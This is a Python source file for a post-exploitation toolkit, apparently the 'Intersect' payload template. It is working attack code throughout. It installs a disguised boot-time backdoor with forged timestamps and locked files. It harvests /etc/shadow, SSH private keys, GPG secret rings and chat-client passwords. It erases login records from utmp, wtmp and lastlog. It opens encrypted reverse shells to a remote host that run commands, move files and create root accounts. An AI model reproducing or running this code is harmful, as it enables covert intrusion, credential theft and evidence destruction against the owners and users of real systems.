#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
        option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
        pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir


def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)
    sys.exit()

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def copy2temp(filename, subdir=""):
    if os.path.exists(filename) is True: 
        pass
        if subdir == "" is True:
            shutil.copy2(filename, Temp_Dir)
        else:
            if os.path.exists(Temp_Dir+"/"+subdir) is True:
                subdir = (Temp_Dir+"/"+subdir)
                shutil.copy2(filename, subdir)
            elif os.path.exists(subdir) is True:
                shutil.copy2(filename, subdir)
            else:
                subdir = (Temp_Dir+"/"+subdir)
                os.mkdir(subdir)
                shutil.copy2(filename, subdir)
    else:
        pass

def write2file(filename, text):
    if os.path.exists(filename) is True:
        target = open(filename, "a")
        target.write(text)
        target.close()
    else:
        pass

def writenew(filename, content):
    new = open(filename, "a")
    new.write(content)
    new.close()

def file2file(readfile, writefile):
    if os.path.exists(readfile) is True:
        readfile = open(readfile)
        if os.path.exists(writefile) is True:
            writefile = open(writefile, "a")
            for lines in readfile.readlines():
                writefile.write(lines)
            writefile.close()
            readfile.close()
        else:
            readfile.close()
    else:
        pass
			
def maketemp(subdir):
    moddir = (Temp_Dir+"/"+subdir)
    if os.path.exists(moddir) is False:
        os.mkdir(moddir)
    else:
        pass

def users():
    global userlist
    userlist = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
            userlist.append(fields[0])

def combinefiles(newfile, filelist):
    content = ''
    for f in filelist:
        if os.path.exists(f) is True:
            content = content + '\n' + open(f).read()
            open(newfile,'wb').write(content)
        else:
            pass

def tardir(name, directory):
    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
    if os.path.exists(directory) is True:
        tar.add("%s/" % directory)
        print("[+] %s added to %s.tar.gz" % (name, directory))
        tar.close()
    else:
        print("[!] Could not find directory %s " % directory)
        tar.close()

def tarlist(name, filelist):
    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
    for files in filelist:
        if os.path.exists(files) is True:
            tar.add(files)
        else:
            print("[!] %s not found. Skipping.." % files)
    tar.close()

    print("[+] %s.tar.gz file created!" % name)




def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['persistent', 'daemon', 'creds', 'scrub', 'aeshttp', 'reversexor']
    PORT = 8888
    RHOST = '192.168.1.4'
    RPORT = 4444
    PPORT = 8888
    PKEY = 'KXYRTUX'
def persistent():
    '''
    @description: Installs any Intersect shell module as a persistent backdoor. Will start shell on every system reboot.
    @author: ohdae [bindshell@live.com] | additional code and fixes by bonsaiviking
    @short: install persistent backdoor
    '''
    header = " => "
    print("Select option: ")
    print("1. Add new service")
    print("2. Remove existing persistence")
    option = raw_input("%s " % (header))

    if option == '1':
        addpersist()
    elif option == '2':
        if os.path.exists("/etc/init.d/sysupd") is True:
            print("[+] Removing Intersect persistence...")
            if whereis('chattr') is not None:
                os.system("chattr -i /etc/init.d/sysupd")
                os.system("chattr -i /etc/default/sysupd")
            os.system("rm /etc/init.d/sysupd")
            os.system("update-rc.d sysupd remove")
            os.system("rm /etc/default/sysupd")
            print("[+] Persistent shell successfully removed!")
        else:
            print("[!] No existing persistent shell found!")
    else:
        print("[!] Invalid option! Enter '1' or '2'")

	
def addpersist():
    header = " => "
    print("Full path of your Intersect script: ")
    currentfile = raw_input("%s " % (header))

    if os.path.exists(currentfile) is True:
        shutil.copy2(currentfile, "/etc/default/sysupd")
    else:
        print("[!] Incorrect file path, Try again!")
        persistent()


    print("Specify which shell to use: ")
    shell = raw_input("%s " % (header))

    if shell in modList is False:
        print("[!] Shell module not loaded!")
        persistent()
    else:
        if os.path.isdir("/etc/init.d"):
            serwrite = open("/etc/init.d/sysupd", "w")
            serwrite.write("#!/bin/sh\ncd /etc/default/\npython sysupd --%s &" % shell)
            serwrite.close()
            os.system("chmod +x /etc/init.d/sysupd")
            os.system("update-rc.d sysupd defaults")
            print("[+] Persistent service installed.")
            print("[+] Modifying accessed and modified times on shell files.")
            copystat = os.stat('/etc/init.d/rcS')
            os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
            os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
            print("[+] Attempting to lock down shell files...")
            if whereis('chattr') is not None:
                status = os.system("chattr +i /etc/default/sysupd")
                if status & 0xff00:
                    print("[!] Chattr exited with non-zero status. Could not lock files.")
                status = os.system("chattr +i /etc/init.d/sysupd")
                if status & 0xff00:
                    print("[!] Chattr exited with non-zero status. Could not lock files.")
            else:
                    print("[!] Chattr not found. Could not lock files.")

            print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")





def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''
    @description: Daemonize an Intersect script. When executed you'll be given the PID to monitor or kill the task if needed
    @author: ohdae [bindshell@live.com]
    @short: run as background process
    '''
    try: 
        pid = os.fork() 
        if pid > 0:
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork one failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1)

    os.chdir("/") 
    os.setsid() 
    os.umask(0) 

    try: 
        pid = os.fork() 
        if pid > 0:
            print "[+] Daemon PID %d" % pid 
            sys.exit(0) 
    except OSError, e: 
        print("[!] Intersect will now run in the background. Check %s for your reports." % Temp_Dir)
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1) 

    si = file(stdin, 'r')
    so = file(stdout, 'a+')
    se = file(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    


def creds():
    '''
    @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
    @author: ohdae [bindshell@live.com]
    @short: enumerate user and system credentials
    '''
    print("[+] Collecting user and system credentials....")
    maketemp("credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    combinefiles("SSH_Locations.txt", sshfiles)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
        copy2temp(x, "credentials")


	users()
    if whereis('pidgin') is not None:
        for user in userlist:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in userlist:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in userlist:
        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
           
            


def scrub():
  '''
  @description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
  @author: ohdae [bindshell@live.com]
  @short: cleans utmp, wtmp and lastlog
  '''
  try:
    Current_User = os.getlogin()
  except OSError:
    print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
    return
    
  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
  writeNewFile(UTMP_FILEPATH, newUtmp)
  print "[+] %s cleaned" % UTMP_FILEPATH
  
  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
  writeNewFile(WTMP_FILEPATH, newWtmp)
  print "[+] %s cleaned" % WTMP_FILEPATH

  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
  writeNewFile(LASTLOG_FILEPATH, newLastlog)
  print "[+] %s cleaned" % LASTLOG_FILEPATH


def scrubFile(filePath, Current_User):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp


def scrubLastlogFile(filePath, Current_User):
  pw  	     = pwd.getpwnam(Current_User)
  uid	     = pw.pw_uid
  idCount    = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
	newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog


def writeNewFile(filePath, fileContents):
  f = open(filePath, "w+b")
  f.write(fileContents)
  f.close()



def aeshttp():
    '''
    @description: Starts a reverse HTTP shell with AES encryption that will connect back to a remote host.
    @short: reverse AES HTTP shell
    @author: original code by David Kennedy aka ReL1k
    '''
    import httplib
    import urllib
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] Python Crypto library is not installed. This module will not work without this!")
        sys.exit(2) 

    BLOCK_SIZE = 32
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"

    cipher = AES.new(secret)

    while 1:

        req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
        message = urllib2.urlopen(req)
        message = base64.b64decode(message.read())
        message = DecodeAES(cipher, message)

        if message == "killme":
            sys.exit()

        if message.startswith("cd"):
            destination = message[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
            else:
                pass


        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        data = proc.stdout.read() + proc.stderr.read()
        data = EncodeAES(cipher, data)
        data = base64.b64encode(data)
        data = urllib.urlencode({'cmd': '%s'}) % (data)
        h = httplib.HTTPConnection('%s:%s' % (RHOST,RPORT))
        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        h.request('POST', '/index.aspx', data, headers)



def xor(string, key):
    '''
    @description: Opens a reverse XOR ciphered TCP shell to a remote host. Interactive shell with download/upload and remote Intersect module execution.
    @author: ohdae [bindshell@live.com]
    @short: reverse XOR TCP shell
    '''
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data
  

def reversexor():
    socksize = 4096
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        conn.connect((RHOST, RPORT))
        conn.send(xor("[+] New connection established!", PKEY))
        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
    except:
        print("[!] Connection error!")
        sys.exit(2)

    while True:
        cmd = conn.recv(socksize)
        cmd2 = xor(cmd, PKEY)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd2.startswith('cd'):
            destination = cmd2[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            elif os.path.isdir(os.getcwd()+destination):
                os.chdir(os.getcwd()+destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            else:
                conn.send(xor("[!] Directory does not exist", PKEY)) 
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send(xor("[+] Root account " + acct + " has been created.", PKEY))

        elif cmd2.startswith('upload'):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, PKEY)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send(xor("[+] File upload complete!", PKEY))
            if not os.path.isfile(filename):
                conn.send(xor("[!] File upload failed! Please try again", PKEY))

        elif cmd2.startswith('download'):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, PKEY)
                conn.sendall(senddata)
            else:
                conn.send(xor("[+] File not found!", PKEY))

        elif cmd2.startswith("rebootsys"):
            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
            os.system("shutdown -h now")
 
        elif cmd2 == ("extask"):
            conn.send(xor(str(modList), PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))

        elif cmd2.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send(xor("[!] Module not loaded!", PKEY))
            else:
                conn.send(xor("[+] Executing %s " % modname, PKEY))
                execmod = modname+"()"
                execmod

        elif cmd2 == ('killme'):
            conn.send(xor("[!] Shutting down shell!\n", PKEY))
            conn.close()
            sys.exit(0)

        elif proc:
            conn.send(xor( stdout , PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))




def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('    -p    --persistent        install persistent backdoor')
    print('    -d    --daemon        run as background process')
    print('    -c    --creds        enumerate user and system credentials')
    print('    -s    --scrub        cleans utmp, wtmp and lastlog')
    print('    -a    --aeshttp        reverse AES HTTP shell')
    print('    -r    --reversexor        reverse XOR TCP shell')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'pdcsar', ['persistent', 'daemon', 'creds', 'scrub', 'aeshttp', 'reversexor', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-p', '--persistent'):
            persistent()
        elif o in ('-d', '--daemon'):
            daemon()
        elif o in ('-c', '--creds'):
            creds()
        elif o in ('-s', '--scrub'):
            scrub()
        elif o in ('-a', '--aeshttp'):
            aeshttp()
        elif o in ('-r', '--reversexor'):
            reversexor()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])